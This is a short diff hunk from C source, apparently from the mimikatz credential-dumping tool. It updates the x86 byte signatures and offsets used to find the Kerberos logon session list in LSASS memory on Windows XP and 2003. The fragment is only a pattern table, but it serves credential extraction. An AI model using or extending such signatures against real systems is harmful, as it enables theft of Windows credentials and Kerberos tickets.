@@ -16,13 +16,13 @@ KULL_M_PATCH_GENERIC KerberosReferences[] = {
 	{KULL_M_WIN_BUILD_10,		{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 5}},
 };
 #elif defined _M_IX86
-BYTE PTRN_WALL_KerbFreeLogonSessionList[]	= {0xeb, 0x0f, 0x6a, 0x01, 0x57, 0x56, 0xe8};
+BYTE PTRN_WALL_KerbReferenceLogonSession[]	= {0x8B, 0x7D, 0x08, 0x8B, 0x17, 0x39, 0x50};
 BYTE PTRN_WNO8_KerbUnloadLogonSessionTable[]= {0x53, 0x8b, 0x18, 0x50, 0x56};
 BYTE PTRN_WIN8_KerbUnloadLogonSessionTable[]= {0x57, 0x8b, 0x38, 0x50, 0x68};
 BYTE PTRN_WI10_KerbUnloadLogonSessionTable[]= {0x56, 0x8b, 0x30, 0x50, 0x57};
 KULL_M_PATCH_GENERIC KerberosReferences[] = {
-	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_KerbFreeLogonSessionList),	PTRN_WALL_KerbFreeLogonSessionList},	{0, NULL}, {-4, 0}},
-	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_KerbFreeLogonSessionList),	PTRN_WALL_KerbFreeLogonSessionList},	{0, NULL}, {-4, 1}},
+	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_KerbReferenceLogonSession),	PTRN_WALL_KerbReferenceLogonSession},	{0, NULL}, {-8, 0}},
+	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_KerbReferenceLogonSession),	PTRN_WALL_KerbReferenceLogonSession},	{0, NULL}, {-8, 1}},
 	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_KerbUnloadLogonSessionTable),	PTRN_WNO8_KerbUnloadLogonSessionTable}, {0, NULL}, {-11,2}},
 	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WNO8_KerbUnloadLogonSessionTable),	PTRN_WNO8_KerbUnloadLogonSessionTable}, {0, NULL}, {-11,3}},
 	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_KerbUnloadLogonSessionTable),	PTRN_WIN8_KerbUnloadLogonSessionTable}, {0, NULL}, {-14,4}},
